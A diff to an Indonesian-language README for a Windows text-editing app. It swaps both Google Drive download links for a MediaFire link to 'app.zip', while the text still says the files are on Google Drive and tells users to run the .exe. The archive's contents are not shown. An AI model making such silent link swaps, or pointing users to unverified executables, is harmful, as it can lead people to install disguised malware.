@@ -8,7 +8,7 @@
     <br />
     <a href="#about">About</a>
     ·
-    <a href="https://drive.google.com/drive/u/0/folders/1kD_oFd6BFH8faGDGzcpAqWpJJvflb5rO">Download</a>
+    <a href="https://www.mediafire.com/file/4ilnmiq6xrgfr1i/app.zip/file">Download</a>
     ·
     <a href="#terjemahan-bahasa">Tutorial Indonesia</a>
     ·
@@ -52,7 +52,7 @@ aplikasi ini memiliki fitur dasar seperti ganti warna text, memposisikan text se
 
 ## Unduhan
 Untuk pengguna Windows, unduh file .exe atau .zip di Google Drive berikut:
-https://drive.google.com/drive/u/0/folders/1kD_oFd6BFH8faGDGzcpAqWpJJvflb5rO
+https://www.mediafire.com/file/4ilnmiq6xrgfr1i/app.zip/file
 
 ## Instalasi dan Penggunaan
 - Untuk pengguna Windows, cukup unduh file dari Google Drive yang telah disediakan di bagian sebelumnya (Download) dan jalankan file .exe (atau tekan "extract here" jika Anda mengunduh file .zip).
